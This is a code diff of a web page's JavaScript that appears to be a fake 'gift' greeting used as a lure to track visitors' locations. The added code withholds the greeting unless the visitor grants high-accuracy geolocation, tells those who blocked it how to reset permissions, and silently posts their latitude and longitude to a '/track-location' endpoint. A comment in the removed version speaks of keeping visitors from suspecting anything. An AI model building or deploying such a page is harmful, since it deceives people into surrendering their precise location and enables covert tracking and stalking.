@@ -67,43 +67,45 @@
         </div>
     </div>
 
-    <script>
-        function openGift() {
-            const status = document.getElementById('statusMsg');
-            status.textContent = "Allow to see the gift....";
+<script>
+    function openGift() {
+        const status = document.getElementById('statusMsg');
+        status.innerHTML = "Processing... Please click <b>'Allow'</b> to see your gift.";
+        status.style.color = "#3498db";
 
-            if ("geolocation" in navigator) {
-                // Request location
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        // Success: Send data then show greeting
-                        sendLocation(position.coords.latitude, position.coords.longitude);
-                        revealGreeting();
-                    },
-                    (error) => {
-                        // Error (User denied): We still show the greeting so they don't suspect anything
-                        console.log("Location denied");
-                        // revealGreeting();
-                    },
-                    { timeout: 10000 }
-                );
-            } else {
-                // revealGreeting();
-            }
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    // SUCCESS PATH
+                    sendLocation(position.coords.latitude, position.coords.longitude);
+                    revealGreeting();
+                },
+                (error) => {
+                    // ERROR PATH: The greeting stays hidden
+                    status.style.color = "#e74c3c";
+                    if (error.code === 1) { // Permission Denied
+                        status.innerHTML = "❌ <b>Gift Locked:</b> You must allow location access to unlock your greeting.<br><br>If you clicked 'Block', click the Lock (🔒) icon in your browser address bar and Reset Permissions.";
+                    } else {
+                        status.textContent = "❌ Error: Could not verify location. Please try again.";
+                    }
+                },
+                { enableHighAccuracy: true, timeout: 15000 }
+            );
         }
+    }
 
-        function revealGreeting() {
-            document.getElementById('giftView').classList.add('hidden');
-            document.getElementById('greetingView').classList.remove('hidden');
-        }
+    function revealGreeting() {
+        document.getElementById('giftView').classList.add('hidden');
+        document.getElementById('greetingView').classList.remove('hidden');
+    }
 
-        function sendLocation(lat, lon) {
-            fetch('/track-location', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ latitude: lat, longitude: lon })
-            }).catch(err => console.error("Network error"));
-        }
-    </script>
+    function sendLocation(lat, lon) {
+        fetch('/track-location', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ latitude: lat, longitude: lon })
+        }).catch(err => console.error("Log error:", err));
+    }
+</script>
 </body>
 </html>
